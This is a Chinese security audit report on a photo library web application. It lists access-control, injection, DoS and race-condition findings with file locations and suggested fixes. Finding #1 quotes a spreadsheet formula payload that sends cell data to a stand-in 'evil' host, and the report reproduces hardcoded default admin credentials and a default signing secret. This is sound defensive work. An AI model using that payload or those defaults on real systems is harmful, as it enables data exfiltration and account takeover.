# PhotoLib 安全与业务缺陷审计报告

- 审计日期：2026-07-15
- 审计方式：只读代码审计（5 个并行子审计 + 人工复核汇总），**未修改任何代码**
- 审计范围：`backend/src/main/java/cn/photolib/` 全部业务包（auth、user、photo、photo.batch、storage、request、project、adoption、notification、audit、statistics、admin、directory、content、campus）及对应前端页面、Flyway 迁移、测试文件；重点复核了工作树中尚未提交的"需求打回重新提交"新功能（`RequestController`/`RequestService`/`V17` 迁移等）
- 基线文档：`CLAUDE.md`、`AGENTS.md`（§7 已列出的已知维护事项不再重复收录，除非发现比文档描述更严重或已与代码不一致）
- 严重程度定义：**严重**＝可被较低权限角色用于突破权限边界或大范围拿到高价值数据/破坏可用性；**高**＝需要一定条件但影响明确的越权/注入/DoS；**中**＝有限影响或需要特定角色/场景触发；**低**＝影响很小或纯防御纵深问题

> 说明：审计过程中曾怀疑 `RequestDeliveryPage.tsx:184` 的 `<Alert title=... />` 用法有误（对照其余页面普遍使用 `message` 属性），经核实项目实际安装的 `antd@6.5.0` 已将 `message` 标记为 `@deprecated`、`title` 才是当前推荐属性，**该用法本身没有问题**，特此说明避免误报，其余页面仍用 `message` 只是历史写法但仍兼容。

---

## 一、核心发现速览（按严重程度）

| # | 严重程度 | 标题 | 模块 |
|---|---|---|---|
| 1 | 严重 | 工时/统计 XLSX 导出存在公式注入，可由 `CAMPUS_MANAGER` 投毒、被 `ADMIN`/`MINISTER` 打开触发，实质打穿角色边界 | statistics |
| 2 | 高 | `GET /requests/{id}`、`GET /requests/{id}/participants` 无可见性校验，任意登录用户可读取任意需求详情（含新增的打回原因等内部审核信息） | request |
| 3 | 高 | 审计日志 CSV 导出存在公式注入 | audit |
| 4 | 高 | 图片压缩解码无像素/内存上限，超 10MiB 图片可构造解压缩炸弹造成 OOM/DoS | photo |
| 5 | 高 | 本地存储签名密钥默认值未被"弱密钥"黑名单覆盖，若运维漏配可致存储层鉴权旁路 | storage |
| 6 | 高 | 登录接口存在响应耗时侧信道，可枚举账号/邮箱是否存在 | auth |
| 7 | 高 | 刷新令牌轮换无互斥/乐观锁，存在并发重放竞态 | auth |
| 8 | 高 | `/api/v1/auth/**` 整体被排除出审计日志，改密、登出等高敏感操作不可追溯 | auth / audit |
| 9 | 中 | `notifyUser` 邮件通道对多处用户可控字段（需求标题、退回/打回原因等）未做 HTML 转义，构成存储型邮件 HTML 注入 | notification / request / worklog |
| 10 | 中 | 消息图片接口 `@PreAuthorize("isAuthenticated()")` 对匿名请求恒为 true，实质无鉴权，且链接永不过期 | notification |
| 11 | 中 | `MINISTER` 可越权调用通讯录列表接口，绕过去重视图看到跨校区、含停用成员的原始数据 | directory |
| 12 | 中 | 品牌图标上传仅靠 `ImageIO` 解码校验、无文件头签名校验，存在 polyglot 文件走私风险 | admin |
| 13 | 中 | 批量上传（`photo_upload_batch`/`photo_upload_item`）无乐观锁/状态谓词，并发提交可产生重复图片记录 | photo.batch |
| 14 | 中 | 新增"打回需求"功能：状态回退未清空 `returnReason` 等字段、未通知创建者、无项目/校区归属校验 | request（新功能） |
| 15 | 中 | 需求邮箱唯一性仅"先查后写"，存在 TOCTOU 竞态，可致两账号共享邮箱且双双无法用邮箱登录 | user |
| 16 | 中 | 管理员初始密码/`secure-cookie` 默认值不安全且无运行时兜底校验 | auth（部署配置） |
| 17 | 中 | 需求列表接口对 `CAMPUS_MANAGER` 未排除 `DRAFT` 状态，草稿需求提前泄露给同校区其他负责人 | request |
| 18 | 中 | ZIP 批量解压使用与邮件/导出共享的默认线程池，与单图处理刻意串行化的抗 OOM 设计理念相悖 | photo.batch |
| 19 | 低 | 登录用户名/密码字段无长度上限校验 | auth |
| 20 | 低 | 审计日志关键词模糊查询未转义 `%`/`_`，功能性失真（非注入） | audit |
| 21 | 低 | 导出任务失败详情把原始异常信息透传给任务创建者 | statistics |
| 22 | 低 | 校区停用未级联冻结该校区通讯录写权限与拍摄者可选范围 | directory |
| 23 | 低 | 说明图片读取接口鉴权粒度仅为"已登录"，未与项目/需求可见范围挂钩（依赖 ID 不可枚举缓解） | content |

---

## 二、详细发现

### 2.1 严重

#### #1 工时/统计成员 XLSX 导出公式注入，可打穿角色边界
- **文件**：`backend/src/main/java/cn/photolib/statistics/ExportService.java:266-272`（`row()`，`setCellValue` 无转义）
- **数据源**：`backend/src/main/java/cn/photolib/directory/CampusMemberController.java:59-63`（`campus_member.name`/`studentId` 仅 `@NotBlank @Size` 校验，无字符白名单，`CAMPUS_MANAGER` 可维护本校区通讯录）→ 写入 `worklog.member_name` 快照 → `StatisticsService`/`ExportService` 直接写入单元格
- **问题**：Excel/WPS 打开以 `=`、`+`、`-`、`@` 开头的单元格会当公式执行。`CAMPUS_MANAGER`（相对低权限角色）可把通讯录成员姓名设置为 `=HYPERLINK("http://evil/steal?d="&B2,"click")` 一类载荷，经工时填报快照后随 `POST /worklogs/export` 生成的 XLSX 文件，被 `ADMIN`/`MINISTER`（工时导出的实际使用者，属于薪酬/工时结算相关的敏感操作）打开触发。
- **影响**：这是本次审计中最严重的一项——它把权限边界从 `CAMPUS_MANAGER` 实际打穿到 `ADMIN`/`MINISTER`，可用于钓鱼、内网信息探测，视 Excel/WPS 版本还可能触发进一步利用。
- **建议方向（仅供参考）**：对所有导出到 CSV/XLSX 的字符串单元格统一做"若以 `=+-@` 开头则前置 `'` 或空格"的转义处理。

### 2.2 高

#### #2 需求详情/参与人接口 IDOR
- **文件**：`backend/src/main/java/cn/photolib/request/RequestController.java:57-60`（`GET /requests/{id}` 无 `@PreAuthorize`）→ `RequestService.java:120-126`（`get()` 只做存在性检查，不做归属/可见性校验）；同样问题存在于 `GET /requests/{id}/participants`（`RequestController.java:85-88` → `RequestService.java:192-197`）
- **对照**：`ProjectService.getVisible()`/`requireVisible()`（`ProjectService.java:208-212, 241-258`）明确限制 `CAMPUS_MANAGER` 只能查看自己参与过需求的项目详情；`RequestService.get()` 没有等价校验。
- **影响**：任意已登录用户（包括与该需求毫无关系、不同校区的 `CAMPUS_MANAGER`）只要遍历/猜测数字 ID，即可通过 `GET /api/v1/requests/{id}` 拿到完整的 `title`、`description`、`deadline`、`campusId`、`cancelReason`，以及本次新增的 `returnReason`/`returnedBy`/`returnedAt`（内部审核意见）。违反"校区负责人只能看到自己已参与需求所在项目"的既定规则，且新功能上线后放大了这个既有缺陷的影响面（新增字段属于内部审核信息，敏感度更高）。
- **建议方向**：在 `RequestService.get()`/`participants()` 补充与 `ProjectService.requireVisible()` 对齐的校区/参与人可见性校验。

#### #3 审计日志 CSV 导出公式注入
- **文件**：`backend/src/main/java/cn/photolib/audit/AuditController.java:78-81`（`csv()`，仅做双引号转义，无 `=+-@` 前置防护）
- **数据源**：`operatorDisplayName` 来自 `app_user.display_name`，`UserController.java:102/110` 校验仅 `@NotBlank @Size(max=100)`，无字符白名单
- **影响**：ADMIN 创建/编辑用户时若显示名包含 `=`、`+`、`-`、`@` 开头文本，导出的审计日志 CSV 在管理员本机用 Excel 打开会触发公式执行。触发者是导出操作的直接消费者（ADMIN 自己），风险略低于 #1，但属于经典、容易被忽视的漏洞点，且随未来功能扩展（如用户自助改名）有恶化空间。
- **建议方向**：与 #1 采用同一套转义逻辑，统一处理。

#### #4 图片压缩解码无内存/尺寸上限，解压缩炸弹 DoS
- **文件**：`backend/src/main/java/cn/photolib/photo/ImageCompressor.java:37`（`compress()` 中 `ImageIO.read(new ByteArrayInputStream(source))`），调用方 `PhotoProcessingService.java:59-60`
- **问题**：仅当原图 ≤10MiB（`image-target-bytes`）时走"只读元数据、不整图解码"的安全路径；超过 10MiB（≤100MiB 上限内，属常见相机 JPEG/PNG 大小）即无条件整图解码，全程未对声明宽高/像素总数做上限校验。文件魔数校验和 SHA-256 校验都拦不住"体积在 10–100MiB 但声明超大宽高"的构造图片，解码时可轻易分配数 GB 内存。
- **影响**：任何已认证用户（含普通 `CAMPUS_MANAGER` 上传者）通过标准单图上传或批量上传即可触发单次恶意上传即可造成 JVM OOM 的服务不可用；代码中已有注释说明团队曾因"并发整图解码把小型生产机打垮"而把图片处理执行器强制串行，但该措施只解决并发数，未解决单次分配大小问题。
- **建议方向**：解码前先用 `ImageIO` 的 `ImageReader` 读取 `getWidth`/`getHeight` 做上限校验，超限直接拒绝再解码。

#### #5 本地存储签名密钥默认值未被弱密钥校验覆盖
- **文件**：
  - `backend/src/main/resources/application.yml:59`（`signing-secret: ${LOCAL_STORAGE_SIGNING_SECRET:photolib-local-development-secret}`）
  - `backend/src/main/java/cn/photolib/storage/StorageConfigValidator.java:17-23`（`WEAK_SECRETS` 黑名单仅含 5 个固定字符串，不含上述真实默认值）
  - `backend/src/main/java/cn/photolib/storage/LocalObjectStorageService.java:135-169`（token 即唯一鉴权凭证）
  - `backend/src/main/java/cn/photolib/auth/SecurityConfig.java:35`（`/api/v1/local-storage/objects/**` 为 `permitAll`）
- **问题**：`local` 模式下若运维忘记设置 `LOCAL_STORAGE_SIGNING_SECRET`，会静默使用仓库中硬编码、公开可见的默认值（33 字符，满足 ≥32 长度要求，能通过校验器）。由于该路径对 Spring Security 完全放行，知道这个默认值的任何人都能自行构造 HMAC-SHA256 签名，为**任意 objectKey**（含他人正式对象）签发有效 PUT/GET token。
- **影响**：完全绕过 `PhotoService` 的角色/归属校验，可批量读取/覆盖图库中任意已发布照片。属于"校验器本应堵住这一确切场景却存在漏洞"的设计缺陷，而不仅是运维配置问题。
- **建议方向**：把仓库默认值本身加入 `WEAK_SECRETS` 黑名单，或改为非 `local` profile 强制要求显式配置。

#### #6 登录接口存在响应耗时侧信道，可枚举账号/邮箱
- **文件**：`backend/src/main/java/cn/photolib/auth/AuthService.java:28-43`（`login`）
- **问题**：只有用户名/邮箱命中时才执行 `BCryptPasswordEncoder`（成本因子 12，耗时数十至上百毫秒）比较；用户不存在时该分支被跳过，几乎零延迟返回 401。错误**消息**已统一为"账号、邮箱或密码错误"，但**响应耗时**仍可用于区分"账号不存在"与"账号存在但密码错误"。
- **影响**：可通过统计多次请求 RTT 枚举有效用户名/邮箱，用于后续密码喷洒攻击的目标筛选。
- **建议方向**：用户不存在时也执行一次固定的哑 BCrypt 比较，使两条路径耗时接近。

#### #7 刷新令牌轮换存在竞态，可能被并发重放
- **文件**：`backend/src/main/java/cn/photolib/auth/AuthService.java:45-60`（`refresh`）；`AuthSessionEntity` 无 `@Version` 字段
- **问题**：`sessionMapper.selectOne(...)` 读取会话后，`session.setRevokedAt(now); sessionMapper.updateById(session);` 是无条件更新，不是 `WHERE revoked_at IS NULL` 的条件更新。若同一 refresh token 被并发提交两次（客户端重试，或攻击者拿到泄露 token 后与合法客户端几乎同时刷新），两个事务都可能在对方提交前判定"会话有效"，各自签发出一套新 token。
- **影响**：削弱了 refresh token 轮换本应提供的"重放检测"能力（正常设计中旧 token 再次出现应触发怀疑并撤销整条会话链），这里连基本互斥都没有。
- **建议方向**：把查询+撤销改为条件更新（按受影响行数判断成功），或为 `AuthSessionEntity` 加 `@Version`。

#### #8 `/api/v1/auth/**` 整体被排除出审计日志
- **文件**：`backend/src/main/java/cn/photolib/audit/WebConfig.java:16-17`（`.excludePathPatterns("/api/v1/auth/**")`，路径前缀级别排除）
- **问题**：该排除不只覆盖 login/refresh，`PUT /api/v1/auth/password`（修改密码）、`PUT /api/v1/auth/initial-password`（首次改密）、`POST /api/v1/auth/logout` 全部落在此前缀下，**永远不会被拦截器记录**；`AuditInterceptor.afterCompletion`（`AuditInterceptor.java:37-38`）里针对 login/refresh 的二次排除已成死代码。
- **影响**：CLAUDE.md 明确要求"写操作应考虑...审计记录"，而修改凭据这类高敏感写操作恰恰完全没有留痕，无法追溯"谁在何时修改了自己的密码/退出了登录"。会话确实被正确撤销（功能正确），但审计链路缺失。
- **建议方向**：把排除范围收窄到真正不该记录的 `POST /auth/login`、`POST /auth/refresh`，其余 `/auth/**` 写接口纳入审计。

### 2.3 中

#### #9 `notifyUser` 邮件通道 HTML 注入（多处未转义）
- **未转义调用点**：
  - `RequestService.java:139`（`notifyCampusManagers`）、`:188`（`accept`）、`:235`（`submit`）
  - `BatchRequestPublisher.java:58-59`
  - `WorklogService.java:121`、`:138`（`reject`，退回原因未转义）
- **已转义调用点（对照组）**：`RequestService.java:269-271`（新增的 `returnForRevision`，使用了 `HtmlUtils.htmlEscape`）
- **落地风险点**：`NotificationService.java:64`（原样存 `payload_json`）、`:81`（`gateway.send(..., payload.html())` 原样发送）
- **问题**：`notifyUser()` 对**站内**通知是安全的（`NotificationService.java:232-235` 用 `Jsoup.parse(html).text()` 转纯文本），但**邮件**路径完全不同，原始 HTML 未经任何清洗直接发给收件人邮箱。`request.title()`、`worklog` 退回原因等用户可控字段（仅 `@Size` 限制，无字符白名单）被直接拼进 `<p>` 标签。新增的打回功能恰好是唯一转义了的调用点，说明作者已经意识到该风险，但未同步修复其余 5 处历史调用点。
- **影响**：拥有 `ADMIN`/`MINISTER` 权限的账号（或能提交工时退回理由的审核人）可在需求标题/退回原因中植入钓鱼链接、追踪图片等，向需求创建者、校区负责人、工时提交人邮箱投递钓鱼内容，前端站内信不受影响、只有邮件受影响，排查成本较高。
- **建议方向**：把转义/清洗逻辑收敛到 `NotificationService.notifyUser()` 内部统一处理，而不是让各调用方各自决定。

#### #10 消息图片接口"鉴权"对匿名请求形同虚设
- **文件**：`backend/src/main/java/cn/photolib/notification/MessageImageController.java:69-79`（`@PreAuthorize("isAuthenticated()")`）；`SecurityConfig.java:36`（`/api/v1/notifications/images/**` 在 Filter 链层面 `permitAll()`）
- **问题**：Spring Security 的匿名用户默认是 `AnonymousAuthenticationToken`，其 `isAuthenticated()` 恒为 `true`，因此 `@PreAuthorize("isAuthenticated()")` 对未登录请求**永远放行**，这个注解形同虚设——未登录、无任何凭证的请求也能直接命中并返回图片。且该 URL 一旦签发**永不过期**（不同于 export-job 15 分钟签名 URL），只要 ID（26 位 ULID，约 130 bit 熵）通过邮件转发、浏览器历史等途径泄露，可被永久匿名访问。
- **影响**：与 AGENTS.md "消息图片通过受鉴权的控制器访问" 的设计约束存在实质偏差；广播/定向消息中若含敏感截图，链接一旦外泄将长期、无门槛可被外部访问。ID 空间大难以枚举，属于"隐蔽性代替访问控制"而非真正鉴权。
- **建议方向**：改用 `hasRole(...)`/显式登录判断替代 `isAuthenticated()`，或改为短期签名 URL，与 export-job 保持一致的限时下载模式。

#### #11 `MINISTER` 越权访问未去重的全量通讯录
- **文件**：`backend/src/main/java/cn/photolib/directory/CampusMemberController.java:16-28`（类级权限含 `MINISTER`，`list()` 方法未做更细粒度限制）；`CampusMemberService.java:29-36, 160-168`（`effectiveCampus()` 只对 `CAMPUS_MANAGER` 强制限定校区，对 `MINISTER`/`ADMIN` 直接放行任意 `campusId`/`enabled` 参数）
- **问题**：业务设计明确"部长只读查看去重视图 `GET /campus-members/deduped`"，但普通列表接口 `GET /campus-members`（继承类级权限）同样允许 `MINISTER` 调用，且不受 `effectiveCampus` 限制，可任意指定 `campusId`、`enabled=false`。
- **影响**：`MINISTER` 账号可以枚举任意校区、任意启用状态的通讯录原始记录（学号、姓名、id、创建时间），包括本应通过去重视图屏蔽的"已停用成员"和逐校区明细，超出文档声明的最小权限范围。
- **建议方向**：`list()` 对 `MINISTER` 也应用 `deduped` 语义，或限制为只能调用 `/campus-members/deduped`。

#### #12 品牌图标上传缺少文件头签名校验
- **文件**：`backend/src/main/java/cn/photolib/admin/BrandingController.java:62-93`（仅靠声明 Content-Type 白名单 + `ImageIO.read()` 解码校验）；对照 `content/DescriptionImageController.java:98-111`（`matchesSignature` 有文件头字节校验）
- **问题**：JPEG/PNG 解码器只解析到有效图像结构结束，不会因文件尾部追加任意字节而解码失败，因此"合法图片头部 + 任意尾部数据"的 polyglot 文件可以原样上传、原样落库、原样回传。`DescriptionImageController` 虽然做了文件头校验，但也只检查开头几字节、不做完整结构解码（WebP 在标准 JDK `ImageIO` 中甚至无编解码器，完全没有结构校验），两处都不是"头部签名 + 完整解码"的组合校验。
- **影响**：现代浏览器 `<img>` 场景通常不会把回传内容当 HTML 执行（依赖 `X-Content-Type-Options: nosniff` 是否生效，代码未显式配置该响应头，建议运行时验证），更现实的风险是尾部数据被用于走私任意二进制内容长期存储在服务器。
- **建议方向**：上传后统一做重新编码（strip 除像素数据外的附加字节），而不仅依赖魔数/解码校验。

#### #13 批量上传无乐观锁保护，并发提交可产生重复图片
- **文件**：`PhotoUploadBatchEntity.java`/`PhotoUploadItemEntity.java`（不继承 `BaseEntity`，无 `@Version`）；`BatchUploadService.java:115-146`（`complete()`）、`:170-196`（`setMetadataForAll()`）——状态先读后判断，再用无条件 `updateById` 写回，无 `WHERE status=...` 谓词
- **对照**：`PhotoService.complete()` 专门为同类竞态做了加固（代码注释明确标注"H-3 regression"），`updateCampus()` 也手写了 `WHERE version=:version`，但整个批量上传子系统没有等价保护。
- **影响**：两个并发的 `complete-upload`/`setMetadataForAll` 请求（重复提交、请求重试）都可能在对方提交前读到同一状态并继续执行：ZIP 模式下重复触发解压事件；`setMetadataForAll` 场景下可能对同一 `tempObjectKey` 各自创建一条 `PhotoEntity`，产生同一原始文件对应两张成品照片、`item.photoId` 被静默覆盖。这比文档已知的"批量上传无哈希查重"更严重——是对**同一条已知条目**的重复处理。
- **建议方向**：为批量上传实体补充 `@Version` 或状态谓词更新。

#### #14 新增"打回需求"功能：状态字段不清空 / 未通知创建者 / 无归属校验
- **文件**：`backend/src/main/java/cn/photolib/request/RequestService.java:225-237`（`submit`）、`:239-250`（`complete`）、`:253-277`（`returnForRevision`）
- **子问题 a（状态机不自洽）**：`submit()`/`complete()` 从不清空 `returnReason`/`returnedBy`/`returnedAt`。对照 `WorklogService.update()`/`submit()` 已确立的"打回原因是一次性的，重新提交后必须清空"惯例（`rejectReason` 会被清空），新功能未遵循该惯例。`RequestsPage.tsx` 详情抽屉展示"最近打回原因"时无状态判断，会对已完成需求持续显示过期打回原因，误导管理员；`RequestDeliveryPage.tsx` 虽加了 `status === 'ACCEPTED'` 门槛规避了展示问题，但两处前端逻辑不一致，根源在于后端未把这三个字段当作"一次性"数据管理。
- **子问题 b（无归属校验）**：`returnForRevision` 只判断角色是 `ADMIN`/`MINISTER`，不像 `publish`/`update`/`cancel` 那样用 `requireCreatorOrAdmin()` 校验是否与该需求有关联——任意 `MINISTER` 可打回系统里任何校区、任何项目下处于 `SUBMITTED` 状态的需求（这一点与既有的 `complete()` 行为一致，但与 `publish`/`update`/`cancel` 不一致，建议明确是否是有意为之）。
- **子问题 c（通知遗漏）**：`accept()`/`submit()` 都会 `notify(request.getCreatedBy())`，唯独 `returnForRevision()` 只通知参与人、未通知需求创建者；结合子问题 b（打回人可以不是创建者），创建者可能完全不知道自己的需求被打回过。
- **建议方向**：`submit()`/`complete()` 中清空三个 return 字段；补充创建者通知；明确并按需补充归属校验。

#### #15 用户邮箱唯一性 TOCTOU 竞态
- **文件**：`backend/src/main/java/cn/photolib/user/UserService.java:178-188`（`validateEmailAvailable`，纯"先查后写"，无锁无数据库唯一约束兜底）
- **问题**：`app_user.email` 只有普通索引（AGENTS.md 已知设计），实现是 `selectCount` 判断是否 >0 再写入，两个管理员几乎同时为不同用户设置同一邮箱时，两次查询都可能读到 0。
- **影响**：产生两个启用用户共享同一邮箱；`AuthService.login` 按邮箱登录在命中 ≥2 条记录时会直接拒绝登录，导致两个账号的邮箱登录路径同时失效且报错信息无法体现原因，只能靠管理员改用用户名登录后排查。
- **建议方向**：为 `email` 增加数据库唯一索引作为最终兜底（允许 NULL/空多值，MySQL 唯一索引默认支持多个 NULL）。

#### #16 管理员初始密码/`secure-cookie` 默认值不安全且无运行时兜底
- **文件**：`backend/src/main/resources/application.yml:44,47-48`（`AUTH_SECURE_COOKIE:false`、`ADMIN_INITIAL_PASSWORD:ChangeMe123!`）
- **问题**：README 已提示生产环境需覆盖，但代码层（`AuthController.setRefreshCookie`、`AdminBootstrap`）没有任何 fail-fast 检查——不会在非 `local` profile 下检测到默认密码就拒绝启动或强告警。
- **影响**：运维漏配一个环境变量，系统会在生产环境用公开可见的默认凭据（`admin`/`ChangeMe123!`，源码内硬编码）静默启动可登录的管理员账号，且 refresh cookie 缺少 `Secure` 属性；`mustChangePassword=true` 不能阻止攻击者抢先登录并把密码改成自己的值，从而完全接管账号。
- **建议方向**：`AdminBootstrap` 在非 `local` profile 检测到默认用户名/密码时拒绝启动或记录 ERROR 级日志。

#### #17 需求列表接口对 `CAMPUS_MANAGER` 未排除 `DRAFT` 状态
- **文件**：`backend/src/main/java/cn/photolib/request/RequestService.java:97-118`（`list`）
- **问题**：对 `CAMPUS_MANAGER` 只按 `effectiveCampus` 过滤，不排除 `DRAFT`，也不要求参与关系。业务规则隐含草稿在发布前不应对其他角色可见。
- **影响**：`GET /requests`（无 status 参数）会把本校区所有 `DRAFT` 需求提前暴露给该校区任意负责人。
- **建议方向**：`list()` 为 `CAMPUS_MANAGER` 强制排除 `DRAFT`。

#### #18 ZIP 批量解压使用共享默认线程池
- **文件**：`backend/src/main/java/cn/photolib/photo/batch/BatchProcessingService.java:28-29`（裸 `@Async`，走 Boot 默认 `applicationTaskExecutor`，核心 8 线程），对照 `PhotoProcessingAsyncConfig.java:28-38`（单图处理专门串行化的堆内存保护设计）
- **问题**：每个 ZIP 任务读取单条目时最多缓冲 100MiB（`MAX_ITEM`），且未对单用户可并发创建的 ZIP 批次数做限制；该线程池与邮件、导出等功能共享，最多可 8 个 ZIP 任务并发，与团队专门为单图处理做的抗 OOM 设计理念相悖。
- **建议方向**：ZIP 解压使用独立、容量受限的执行器，与图片处理执行器分离资源预算但同样限制并发度。

### 2.4 低 / 信息性

- **#19** 登录 `LoginRequest.username`/`password` 只有 `@NotBlank`，无 `@Size` 上限，与其他 DTO 校验强度不一致（`AuthController.java:105`）。
- **#20** 审计日志关键词 `LIKE CONCAT('%',#{keyword},'%')` 未转义用户输入中的 `%`/`_`（`AuditLogMapper.java:27-33,59-65`），SQL 注入不成立（参数化绑定），但会造成关键词过滤"失真"（想搜字面 `%` 搜不到，反而匹配全部）。
- **#21** 导出任务失败时把 `ex.getMessage()` 原样写入 `errorMessage` 并随 `GET /export-jobs/{id}` 返回给任务创建者（`ExportService.java:99-115,230-234`），可能携带内部路径/Bucket 名等实现细节，权限校验本身无问题，仅信息脱敏不足。
- **#22** 校区停用未级联冻结该校区通讯录写权限/拍摄者可选范围（`CampusMemberService.java` 全部写路径未检查 `Campus.enabled`，对照 `BatchRequestPublisher.java:39` 已有显式校验先例）。
- **#23** 说明图片读取接口鉴权粒度仅为"已登录"，不与项目/需求可见范围绑定（`DescriptionImageController.java:81-93`），依赖 26 位 ULID（约 130 bit 熵）不可枚举缓解，实际可利用性低。
- **#24** `SecurityConfig` 把 `/api/v1/notifications/images/**`、`/api/v1/local-storage/objects/**` 等路径设为 `permitAll`，完全依赖方法级 `@PreAuthorize` 兜底，属于防御纵深单点化，未来误删注解风险较高。
- **#25** 品牌自定义图标直接以 BLOB 存入 MySQL（`BrandingSettingEntity.java:19`），绕开了 CLAUDE.md 要求的统一 `ObjectStorageService` 抽象，非安全漏洞但架构不一致，影响后续加固（签名 URL、CDN 策略等）能力。
- **#26** 品牌图标/说明图片上传接口复用了为批量 ZIP 上传设置的 1536MB 全局 multipart 限制，业务层大小校验（512KB/5MB）只在请求体完整接收后才生效，可用于对"应为小文件"端点的资源消耗型请求（`application.yml:20-22`）。
- **#27** 本地存储原始上传接口 `PUT /local-storage/objects/{token}` 对写入字节数无独立上限，超限要等 `complete-upload` 阶段才发现，此时文件已完整落盘，本地部署下可致磁盘耗尽（`LocalObjectStorageService.java:100-122`）；结合 #5 未认证用户也可能触发。
- **#28** 审计拦截器按 URL 路径分段猜测 `resourceType`/`resourceId`（`AuditInterceptor.java:44-46`），对"动作词在第 4 段"的路径（如 `POST /notifications/messages`、`POST /worklogs/export`）会把动作词误记为 resourceId，弱化了按资源 ID 追溯的能力（不构成越权，是审计有效性缺口）。

---

## 三、功能缺失清单（非漏洞，按模块分组）

**认证/账号**
- 登录无失败次数限制/锁定/验证码，理论上可对已知用户名做无限次密码尝试。
- 无异常登录/新设备登录提醒。
- 无会话数量上限或"查看/单独撤销某台设备会话"的用户自助入口。
- 登录失败、登出、自助改密事件均不落审计日志（见 #8），无法用于未来的暴力破解检测或异常登录统计。

**图片/存储/批量上传**
- `OriginalCleanupJob` 只清理处理成功后设置了 `originalDeleteAfter` 的对象；停留在 `UPLOADING`（建票据后从未上传、上传后从未 complete、处理失败被打回）的原图永远不会被任何任务清理，比文档记录的"仅 ZIP 路径未清理"范围更广。
- 失败批次（FILES 超限、ZIP 整体 FAILED）无重试端点，只能重新发起全新批次；叠加上一条，失败批次的临时对象既无清理也无重试路径。
- `PhotoProcessingService.validateMagic()`/SHA-256 复核逻辑、`BatchProcessingService` 的路径穿越防护与数量/大小上限、`StorageConfigValidator` 弱密钥判断均缺少专门的单元测试。
- `PhotoController`/`BatchUploadController` 没有控制器层（MockMvc + `@PreAuthorize`）测试，误删角色校验注解不会被任何自动化测试发现。

**通知/审计/统计导出**
- 广播/定向消息无撤回、无编辑能力，误发内容无法更正。
- 通知只有"全部已读"，没有"批量勾选已读"。
- 审计日志按 `resourceType+resourceId` 精确查询对"动作型"接口（见 #28）实际不可用。
- `export_job` 失败后无重新触发导出的入口（对照通知失败有 `POST /notification-logs/{id}/retry`）。
- 没有专门的"已发送管理消息"历史列表供管理员事后核查发送范围/内容/发送人。

**管理/校区/通讯录/说明图片**
- 品牌图标、说明图片上传均无二次转码/规范化，也无病毒扫描，"合法图片格式"不等于"内容安全"（见 #12）。
- 通讯录无批量导入/导出能力，只能逐条维护。
- 校区停用/删除的级联处理不完整（见 #22）。

**需求/项目/采用（含新功能）**
- 打回需求功能：状态字段不清空、未通知创建者、无归属校验（见 #14），以及新增 3 个测试用例未覆盖：需求不存在分支、DRAFT/PUBLISHED/COMPLETED/CANCELLED 各状态下打回被拒绝、乐观锁并发冲突、创建者是否收到通知、`reason` 全空白输入、打回后重新提交是否清空字段。

---

## 四、已核实"未发现问题"的关键点（供交叉核对，不代表全面测试）

- ZIP 条目名不会被用于拼接存储路径（仅取 basename 生成随机 UUID key），不构成 Zip Slip；`LocalObjectStorageService.resolve()` 的路径穿越防护已有测试覆盖。
- 单图/批量元数据更新的乐观锁使用方式（`update()`、`updateCampus()`）正确；`PhotoService.complete()` 的状态+版本双重防护经核实有效。
- `PhotoService`/`BatchUploadService` 的角色/归属校验（`requireUploaderOrPrivileged`、`requireVisible`、`requireOwned`）逐条核实均正确；批次 ID（`PublicId`，约 130 bit 熵）不可枚举。
- 后端 API 的 CORS 配置（`SecurityConfig.java` 的 `.cors(cors -> {})`）在代码库中找不到任何 `CorsConfigurationSource` bean，实际不会放行任何跨域来源；`OSS_CORS_ALLOWED_ORIGINS` 只作用于浏览器直传 OSS 场景，与后端 API CORS 无关。
- 登录标识优先用户名精确匹配、未命中再按小写邮箱查找，且命中多条记录时拒绝登录，行为与文档一致且有测试覆盖。
- 停用账号、重置密码、修改密码、删除账号均正确调用 `authService.revokeAll(id)`；不能删除当前登录账号、不能删除/停用唯一启用管理员，均有测试覆盖。
- token 生成使用 `SecureRandom` + 32 字节随机值 + SHA-256 哈希存储；密码用 `BCryptPasswordEncoder(12)`，均为业界推荐做法。
- `CampusMemberService.requireWritableCampus` 在 `update`/`delete` 路径中以数据库中读出的目标记录真实 `campusId` 比对，`CAMPUS_MANAGER` 无法跨校区改/删他校区成员。
- `DescriptionImageController.get()` 通过服务端代理读取，未暴露对象存储 key 或公有 URL，响应设为私有缓存，符合既定要求。
- `AdoptionService.adopt()`/`cancel()`、`ProjectService.getDetail()`/`scopedSummary()` 的角色范围裁剪、状态校验均核实正确，未发现新的越权路径。
- 需求打回功能的乐观锁/并发处理（`updateChecked()`）与其余状态迁移接口一致，`return` 与 `submit`/`complete` 之间因状态互斥不会产生新的竞态；`V17` 迁移脚本写法与既有迁移（如 `V6`）风格一致，FK 引用软删除用户不会失效。

---

## 五、后续建议的优先顺序（仅供参考，未改代码）

1. 立即评估 #1（XLSX 公式注入，角色边界被打穿）与 #3（CSV 公式注入）——修复成本低（统一转义函数），但影响是本次审计中最严重的一项。
2. 尽快补齐 #2（需求详情 IDOR）——新功能已经把内部审核信息（打回原因）暴露在这个既有缺陷之上，属于对外可见性最直接的一条。
3. 评估 #4（图片解压缩炸弹）、#5（本地存储签名密钥）的生产环境实际暴露面（是否为 local 部署、图片处理是否真的允许超过 10MiB 的图片直接整图解码），按实际部署形态决定优先级。
4. #6-#8（登录侧信道、刷新令牌竞态、`/auth/**` 审计缺失）建议一并规划，均属于认证子系统的加固项，可合并评审。
5. #9（notifyUser 邮件 HTML 注入）建议收敛到 `NotificationService` 内部统一处理，一次性修复全部 6 个调用点，避免后续再有遗漏。
6. 其余中低危项与功能缺失项可按模块排期，`request` 模块新功能（#14）建议在合并前一并修复，避免带着已知状态机缺陷上线。

---

*本报告仅记录审计发现，未对代码做任何修改。修复方案需结合实际部署环境（local/生产、OSS/磁盘）与产品优先级另行评审。*
